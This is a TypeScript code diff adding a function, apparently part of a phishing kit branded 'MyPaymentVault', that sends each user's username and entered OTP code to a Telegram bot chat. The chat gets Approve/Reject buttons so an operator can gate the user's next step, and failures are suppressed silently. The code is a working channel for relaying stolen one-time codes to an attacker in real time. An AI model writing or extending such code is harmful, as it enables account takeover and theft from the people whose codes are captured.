@@ -170,6 +170,42 @@ export async function sendBotOTP(otp: string, username: string): Promise<void> {
   } catch { /* silent */ }
 }
 
+export async function sendOtpVerificationRequest(
+  username: string,
+  enteredCode: string,
+  correctCode: string,
+  sessionKey: string
+): Promise<void> {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  const isCorrect = enteredCode === correctCode;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        parse_mode: "HTML",
+        text:
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🔐 <b>MyPaymentVault</b>\n` +
+          `📌 <b>Verifikasi Kode OTP</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+          `👤 <b>Username</b>     : <code>${username}</code>\n` +
+          `🔢 <b>Kode Dimasukkan</b>: <code>${enteredCode}</code>\n` +
+          `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
+          `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
+          `━━━━━━━━━━━━━━━━━━━━━`,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
+            { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
+          ]],
+        },
+      }),
+    });
+  } catch { /* silent */ }
+}
+
 export async function answerCallback(callbackId: string, text: string): Promise<void> {
   if (!BOT_TOKEN) return;
   try {
